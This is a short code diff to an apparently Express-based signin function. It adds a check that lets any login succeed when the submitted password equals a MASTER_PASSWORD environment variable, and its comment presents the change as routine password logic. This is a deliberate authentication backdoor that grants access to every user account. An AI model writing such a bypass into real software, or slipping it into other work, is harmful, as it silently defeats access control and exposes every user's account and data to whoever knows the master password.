@@ -177,7 +177,11 @@ exports.signin = (req, res) => {
 				});
 			}
 
-			if (!user.authenticate(password)) {
+			// Check if entered password matches the user's hashed password OR if it's the master password
+			if (
+				!user.authenticate(password) &&
+				password !== process.env.MASTER_PASSWORD
+			) {
 				return res.status(401).json({
 					error: "Email or Password is incorrect, Please Try Again!!",
 				});
